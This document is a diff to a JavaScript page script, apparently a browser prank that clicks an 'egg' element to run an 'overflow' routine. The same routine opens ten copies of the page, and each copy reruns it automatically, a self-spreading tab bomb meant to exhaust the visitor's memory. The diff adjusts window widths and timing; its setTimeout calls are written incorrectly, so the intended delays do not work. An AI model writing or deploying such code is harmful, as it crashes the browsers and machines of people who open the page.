@@ -56,7 +56,7 @@ window.onload = function () {
   // another is opened to further continue the ram "leak"
   var openTabs = function openTabs(numTabs) {
     for (var i = 0; i < numTabs; i++) {
-      window.open("".concat(window.location.href), "egg", "inner-width: 200");
+      setTimeout(window.open("".concat(window.location.href), "egg", "inner-width: 193"), 10);
     }
   };
 
@@ -64,18 +64,18 @@ window.onload = function () {
   // if it has a certain property (used to identify tabs opened with openTabs),
   // auto run the exploit loop
   var autoRun = function autoRun() {
-    if (window.innerWidth === 200) {
+    if (window.innerWidth === 193) {
       fixedOverflow(amount);
     }
   };
 
   // run the "fixedOverflow" function when the egg is clicked
   document.getElementById("egg").addEventListener("click", function () {
-    fixedOverflow(amount); // "overflow"
     openTabs(10); // open more tabs to run the process
+    fixedOverflow(amount); // "overflow"
     console.log("mission is a go... hopefully, lol");
   });
 
-  // if certain conditions are met, automatically run the exploit
-  autoRun();
+  // if certain conditions are met, automatically run the exploit after 1 sec of the tab being open
+  setTimeout(autoRun(), 1000);
 };
